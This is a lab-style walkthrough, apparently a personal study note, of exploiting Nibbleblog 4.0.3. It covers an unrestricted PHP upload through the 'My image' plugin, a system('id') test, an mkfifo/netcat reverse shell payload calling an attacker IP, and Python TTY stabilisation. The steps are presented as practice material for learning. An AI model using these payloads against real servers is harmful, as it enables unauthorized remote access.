This summary breaks down the exploitation process of Nibbleblog 4.0.3 into a structured format perfect for an Obsidian note.

---

## **Nibbleblog 4.0.3: Admin Portal to RCE**

### **1. Initial Enumeration (Post-Auth)**

After gaining access to the admin portal, check the version and available features.

- **Version:** 4.0.3 (Vulnerable).
    
- **Target Area:** **Plugins** page.
    
- **Vulnerability:** The **"My image"** plugin allows file uploads without proper extension filtering or content validation.
    

### **2. Initial Access & Code Execution**

To test for Remote Code Execution (RCE), bypass the intended use of the image uploader:

1. **Craft Payload:** Create a simple PHP test script:
    
    `<?php system('id'); ?>`
    
2. **Upload:** Use the "My image" plugin to upload the `.php` file.
    
    - _Note:_ Expect various PHP errors (e.g., `imagesx()` errors) as the backend fails to process the script as a valid image.
        
3. **Locate File:** Based on directory brute-forcing, the upload path is:
    
    `http://<host>/nibbleblog/content/private/plugins/my_image/image.php`
    
4. **Verify:** Execute with `curl` or a browser. If successful, you will see the UID/GID of the web server user (e.g., `nibbler`).
    

### **3. Gaining a Reverse Shell**

Once RCE is confirmed, upgrade the payload to gain an interactive session.

- **Payload (PHP + Bash):**
    
    PHP
    
    ```
    <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACK_IP> <PORT> >/tmp/f"); ?>
    ```
    
- **Execution Steps:**
    
    1. Start a Netcat listener on your machine: `nc -lvnp <PORT>`.
        
    2. Re-upload the modified PHP script via the "My image" plugin.
        
    3. Trigger the script by visiting the `image.php` URL.
        

### **4. Post-Exploitation & Shell Stabilization**

The initial shell is often a "dumb" shell (no tab-completion, no `su` support).

- **Check Python version:**
    
    - `which python` (If not found, try Python 3)
        
    - `which python3`
        
- **Spawn TTY:**
    
    Bash
    
    ```
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    
- **Initial Findings:** Check `/home/nibbler/` for `user.txt` and other interesting files like `personal.zip`.
    

---

> [!TIP]
> 
> **Key Takeaway:** Even if an upload returns "errors," always check the plugin's directory in `/content/private/` to see if the file persisted on the server.

